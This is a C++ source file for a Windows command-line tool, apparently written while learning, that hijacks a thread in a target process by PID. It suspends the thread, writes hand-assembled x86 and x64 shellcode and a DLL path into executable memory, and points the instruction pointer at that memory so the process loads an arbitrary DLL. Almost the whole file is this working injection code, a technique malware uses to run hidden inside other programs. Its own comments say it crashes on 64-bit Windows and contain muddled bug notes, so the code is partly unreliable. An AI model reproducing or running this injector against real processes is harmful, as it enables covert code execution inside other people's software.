//This currently seems to crashing all the process on windows 64bit in general so not fully funcational

#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

int Error(const char* msg) {
	printf("%s (%u)\n", msg, ::GetLastError());
	return 1;
}

#ifndef _WIN64 //Not too sure why this is required I assume it something for reference
void __declspec(naked) InjectedFuncation() {
	__asm {
		pushad
		push 11111111h
		mov eax, 22222222h
		call eax
		popad
		push 33333333h
		ret
	}

}
#endif




bool DoInjection(HANDLE hProcess, HANDLE hThread, PCSTR dllPath) {
//It turns out the issue was caused by a typo in the following line 
#ifdef _WIN64 
	BYTE code[] = {
		0x48, 0x83, 0xec, 0x28,
		0x48, 0x89, 0x44, 0x24, 0x18,
		0x48, 0x89, 0x4c, 0x24, 0x10,
		0x48, 0xb9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
		0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
		0xff, 0xd0,
		0x48, 0x8b, 0x4c, 0x24, 0x10,
		0x48, 0x8b, 0x44, 0x24, 0x18,
		0x48, 0x83, 0xc4, 0x28,
		0x49, 0xbb, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
		0x41, 0xff, 0xe3 //comma place here cause issues in the shellcode
	};
#else
	BYTE code[] = {
		0x60,
		0x68, 0x11, 0x11, 0x11, 0x11, //Too many bytes where places here
		0xb8, 0x22, 0x22, 0x22, 0x22, 
		0xff, 0xd0,
		0x61,
		0x68, 0x33, 0x33, 0x33, 0x33,
		0xc3
	};
#endif



	const int page_size = 1 << 12;


	auto buffer = (char*)VirtualAllocEx(hProcess, nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!buffer)
		return false;

	if (SuspendThread(hThread) == -1)
		return false;

	CONTEXT context;
	context.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &context)) {
		ResumeThread(hThread);
		return false;
	}

	void* loadLibraryAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

#ifdef _WIN64 //Seems to be buffer error here which may need to be further investigated to improve understanding
	* (PVOID*)(code + 0x10) = (void*)(buffer + page_size / 2);
	*(PVOID*)(code + 0x1a) = loadLibraryAddress;
	*(unsigned long long*)(code + 0x34) = context.Rip;
#else
	* (PVOID*)(code + 2) = (void*)(buffer + page_size / 2);
	*(PVOID*)(code + 7) = loadLibraryAddress;
	*(unsigned*)(code + 0xf) = context.Eip;
#endif


	if (!WriteProcessMemory(hProcess, buffer, code, sizeof(code), nullptr)) {
		ResumeThread(hThread);
		return false;
	}
																										
	if (!WriteProcessMemory(hProcess, buffer + page_size / 2, dllPath, strlen(dllPath), nullptr)) {//strlen was a important reference
		ResumeThread(hThread);
		return false;
	}

#ifdef _WIN64
	context.Rip = (unsigned long long)buffer;
#else
	context.Eip = (DWORD)buffer;
#endif
	if (!SetThreadContext(hThread, &context))
		return false;

	ResumeThread(hThread);

	return true;
}



int GetFirstThreadInProcess(int pid) {

	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	THREADENTRY32 te = { sizeof(te) };
	if (!Thread32First(hSnapshot, &te)) {
		CloseHandle(hSnapshot);
		return 0;
	}


	int tid = 0;
	do {
		if (te.th32OwnerProcessID == pid) {
			tid = te.th32ThreadID;
			break;
		}
	} while (Thread32Next(hSnapshot, &te));

	CloseHandle(hSnapshot);
	return tid;
}

int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("Usage: ThreadHijack <pid> <dllpath>\n");
		return 0;
	}

	//Initial issue with pid type
	auto pid = atoi(argv[1]);

	HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
	if (!hProcess)
		return Error("Error opening process");

	DWORD tid = GetFirstThreadInProcess(pid);

	auto hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, FALSE, tid);
	if (!hThread)
		return Error("Failed to open thread");

	if (!DoInjection(hProcess, hThread, argv[argc - 1]))
		return Error("Failed to inject DLL");

	PostThreadMessage(tid, WM_NULL, 0, 0);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}
